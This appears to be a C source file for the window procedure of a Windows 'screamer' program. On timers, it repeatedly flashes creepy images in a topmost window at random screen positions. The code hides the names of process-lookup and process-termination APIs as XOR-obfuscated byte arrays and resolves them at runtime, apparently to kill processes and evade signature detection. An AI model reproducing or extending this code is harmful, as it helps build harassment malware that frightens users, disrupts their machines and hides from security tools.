#define _CRT_RAND_S
#include <stdlib.h>
#include "functions.h"
#include <Windows.h>
#include "cd2d.h"
#include <wincodec.h>
#include "resource.h"
#include <malloc.h>
#include "screamer_control.h"
#include "DestroyStruct.h"
#include "ScreamerStruct.h"
#include "getRequiredScreamerStatus.h"
#include "loadJpegResource.h"
#include "windowDestroyEnumerator.h"
#include "decryptString.h"
#include "getScreamerStatusChangeDelay.h"

#include "screamerWndProc.h"
LRESULT screamerWndProc(HWND hWnd, UINT uInt, WPARAM wParam, LPARAM lParam) {
#define TIMER_UPDATE 10001
#define TIMER_SHOW 10002
#define TIMER_HIDE 10003
#define PERIOD 2000
#define SHOW_TIME 500
	struct ScreamerStruct* screamer_data;
	screamer_data = (struct ScreamerStruct*)GetWindowLongPtrW(hWnd, GWLP_USERDATA);
	switch (uInt) {
	case WM_CREATE:
		screamer_data = malloc(sizeof(struct ScreamerStruct));
		if (screamer_data) {
			CREATESTRUCTW* cs = (CREATESTRUCTW*) lParam;
			memset_wrapper(screamer_data, 0, sizeof(struct ScreamerStruct));
			SetWindowLongPtrW(hWnd, GWLP_USERDATA, (LONG_PTR)screamer_data);
			screamer_data->destroy.user32 = LoadLibraryExW(L"user32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			screamer_data->destroy.kernel32 = LoadLibraryExW(L"kernel32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			if (!(screamer_data->destroy.user32 && screamer_data->destroy.kernel32)) {
				if (screamer_data->destroy.user32) FreeLibrary(screamer_data->destroy.user32);
				if (screamer_data->destroy.kernel32) FreeLibrary(screamer_data->destroy.kernel32);
				free(screamer_data);
				return -1;
			};
			static const char gwtpi_a[] = { 0xa9, 0x33, 0x06, 0x81, 0x9c, 0xee, 0x53, 0xd0, 0x62, 0xa1, 0xaf, 0xcc, 0x50, 0xc3, 0x2a, 0x45, 0xbd, 0x10, 0x91, 0x07, 0xab, 0xf2, 0x3d, 0x85 };
			static const char gwtpi_b[] = { 0x11, 0xa9, 0x8d, 0x29, 0x0a, 0x7f, 0xc8, 0x40, 0xea, 0x0a, 0x38, 0x41, 0xca, 0x5d, 0xb1, 0xea, 0x30, 0x80, 0x0d, 0x9d, 0x27, 0x7e, 0x8b, 0x1e };
			char gwtpi[25];
			decryptString(gwtpi_a, gwtpi_b, gwtpi, 24, sizeof(char));
			gwtpi[24] = '\0';
			screamer_data->destroy.hwnd_to_pid = (DWORD(__cdecl*) (HWND, LPDWORD)) GetProcAddress(screamer_data->destroy.user32, gwtpi);
			static const char op_a[] = { 0xf9, 0xbf, 0xbc, 0xbf, 0x43, 0xa9, 0xba, 0x7a, 0x0f, 0x99, 0xc4 };
			static const char op_b[] = { 0x49, 0x30, 0x26, 0x2e, 0xec, 0x24, 0x2a, 0xe6, 0x95, 0x15, 0x48 };
			char op[12];
			decryptString(op_a, op_b, op, 11, sizeof(char));
			op[11] = '\0';
			screamer_data->destroy.open_process = (HANDLE(__cdecl*)(DWORD, BOOL, DWORD)) GetProcAddress(screamer_data->destroy.kernel32, op);
			static const char tp_a[] = { 0x18, 0xbd, 0xcd, 0xe1, 0x0f, 0xc2, 0x32, 0x59, 0x6e, 0xce, 0x5a, 0xd2, 0x98, 0x89, 0x6f, 0xb2 };
			static const char tp_b[] = { 0xb3, 0x27, 0x40, 0x73, 0x99, 0x53, 0xac, 0xd2, 0xf4, 0x61, 0xd7, 0x42, 0x04, 0x13, 0xe3, 0x3e };
			char tp[17];
			decryptString(tp_a, tp_b, tp, 16, sizeof(char));
			tp[16] = '\0';
			screamer_data->destroy.terminate_process = (BOOL(__cdecl*)(HANDLE, UINT)) GetProcAddress(screamer_data->destroy.kernel32, tp);
			if (!(screamer_data->destroy.hwnd_to_pid && screamer_data->destroy.open_process && screamer_data->destroy.terminate_process)) {
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			};
			static const int screamer_resources[PICTURES_COUNT] = { IDR_CREEPY1, IDR_CREEPY2, IDR_CREEPY3, IDR_CREEPY4, IDR_CREEPY5, IDR_CREEPY6, IDR_CREEPY7, IDR_CREEPY8 };
			ID2D1Factory* d2d_factory;
			if (FAILED(D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &IID_ID2D1Factory, 0, &d2d_factory))) {
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			};
			D2D1_RENDER_TARGET_PROPERTIES d2d_props;
			d2d_props.type = D2D1_RENDER_TARGET_TYPE_DEFAULT;
			d2d_props.pixelFormat = (D2D1_PIXEL_FORMAT) { DXGI_FORMAT_UNKNOWN, D2D1_ALPHA_MODE_UNKNOWN };
			d2d_props.dpiX = d2d_props.dpiY = 0;
			d2d_props.usage = D2D1_RENDER_TARGET_USAGE_NONE;
			d2d_props.minLevel = D2D1_FEATURE_LEVEL_DEFAULT;
			D2D1_HWND_RENDER_TARGET_PROPERTIES d2d_tprops;
			d2d_tprops.hwnd = hWnd;
			d2d_tprops.pixelSize = (D2D1_SIZE_U) {cs->cx, cs->cy};
			d2d_tprops.presentOptions = D2D1_PRESENT_OPTIONS_NONE;
			if (FAILED(ID2D1Factory_CreateHwndRenderTarget(d2d_factory, &d2d_props, &d2d_tprops, &screamer_data->d2d_target))) {
				ID2D1Factory_Release(d2d_factory);
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			};
			IWICImagingFactory* wic_factory;
			if (FAILED(CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_ALL, &IID_IWICImagingFactory, &wic_factory))) {
				ID2D1HwndRenderTarget_Release(screamer_data->d2d_target);
				ID2D1Factory_Release(d2d_factory);
				FreeLibrary(screamer_data->destroy.kernel32);
				FreeLibrary(screamer_data->destroy.user32);
				free(screamer_data);
				return -1;
			};
			for (int j = 0; j < PICTURES_COUNT; j++) {
				screamer_data->pictures[j] = NULL;
			};
			for (int j = 0; j < PICTURES_COUNT; j++) {
				screamer_data->pictures[j] = loadJpegResource(wic_factory, screamer_data->d2d_target, screamer_resources[j]);
				if (NULL == screamer_data->pictures[j]) {
					for (int i = 0; i < j; i++) ID2D1Bitmap_Release(screamer_data->pictures[i]);
					wic_factory->lpVtbl->Release(wic_factory);
					ID2D1HwndRenderTarget_Release(screamer_data->d2d_target);
					ID2D1Factory_Release(d2d_factory);
					FreeLibrary(screamer_data->destroy.kernel32);
					FreeLibrary(screamer_data->destroy.user32);
					free(screamer_data);
					return -1;
				};
			};
			ID2D1Factory_Release(d2d_factory);
			wic_factory->lpVtbl->Release(wic_factory);
			if (getRequiredScreamerStatus()) {
				PostMessageW(hWnd, WM_COMMAND, SCREAMER_ENABLE, 0);
			};
			SetTimer(hWnd, TIMER_UPDATE, getScreamerStatusChangeDelay(), NULL);
		}
		break;
	case WM_DESTROY:
		for (int i = 0; i < PICTURES_COUNT; i++) ID2D1Bitmap_Release(screamer_data->pictures[i]);
		ID2D1HwndRenderTarget_Release(screamer_data->d2d_target);
		FreeLibrary(screamer_data->destroy.kernel32);
		FreeLibrary(screamer_data->destroy.user32);
		free(screamer_data);
		break;
	case WM_PAINT:
		PAINTSTRUCT ps;
		BeginPaint(hWnd, &ps);
		ID2D1HwndRenderTarget_BeginDraw(screamer_data->d2d_target);
		const D2D1_SIZE_U size = ID2D1Bitmap_GetPixelSize(screamer_data->pictures[screamer_data->index]);
		D2D_RECT_F src_rect, dst_rect;
		src_rect.left = src_rect.top = 0;
		src_rect.right = size.width;
		src_rect.bottom = size.height;
		dst_rect = src_rect;
		ID2D1HwndRenderTarget_DrawBitmap(screamer_data->d2d_target, screamer_data->pictures[screamer_data->index], &dst_rect, 1, D2D1_BITMAP_INTERPOLATION_MODE_NEAREST_NEIGHBOR, &src_rect);
		UINT64 t1, t2;
		ID2D1HwndRenderTarget_EndDraw(screamer_data->d2d_target, &t1, &t2);
		EndPaint(hWnd, &ps);
		break;
	case WM_COMMAND:
		if (wParam == SCREAMER_ENABLE) {
			ShowWindow(hWnd, SW_NORMAL);
			SetTimer(hWnd, TIMER_HIDE, SHOW_TIME, NULL);
			KillTimer(hWnd, TIMER_SHOW);
		}
		else if (wParam == SCREAMER_DISABLE) {
			ShowWindow(hWnd, SW_HIDE);
			KillTimer(hWnd, TIMER_SHOW);
			KillTimer(hWnd, TIMER_HIDE);
		};
		break;
	case WM_TIMER:
		if (wParam == TIMER_UPDATE) {
			SetTimer(hWnd, TIMER_UPDATE, getScreamerStatusChangeDelay(), NULL);
			if (getRequiredScreamerStatus()) {
				PostMessageW(hWnd, WM_COMMAND, SCREAMER_ENABLE, 0);
			}
			else {
				PostMessageW(hWnd, WM_COMMAND, SCREAMER_DISABLE, 0);
			};
		}
		else if (wParam == TIMER_SHOW) {
			rand_s(&(screamer_data->index));
			screamer_data->index %= PICTURES_COUNT;
			unsigned int x, y;
			rand_s(&x);
			rand_s(&y);
			const D2D1_SIZE_U size = ID2D1Bitmap_GetPixelSize(screamer_data->pictures[screamer_data->index]);
			x %= (GetSystemMetrics(SM_CXSCREEN) - size.width);
			y %= (GetSystemMetrics(SM_CYSCREEN) - size.height);
			SetWindowPos(hWnd, HWND_TOPMOST, x, y, size.width, size.height, SWP_NOACTIVATE | SWP_SHOWWINDOW);
			ID2D1HwndRenderTarget_Resize(screamer_data->d2d_target, &size);
			ShowWindow(hWnd, SW_SHOW);
			InvalidateRect(hWnd, NULL, FALSE);
			KillTimer(hWnd, TIMER_SHOW);
			SetTimer(hWnd, TIMER_HIDE, SHOW_TIME, NULL);
		}
		else if (wParam == TIMER_HIDE) {
			ShowWindow(hWnd, SW_HIDE);
			KillTimer(hWnd, TIMER_HIDE);
			SetTimer(hWnd, TIMER_SHOW, PERIOD - SHOW_TIME, NULL);
		}
		break;
	default:
		return DefWindowProcW(hWnd, uInt, wParam, lParam);
		break;
	};
	return 0;
};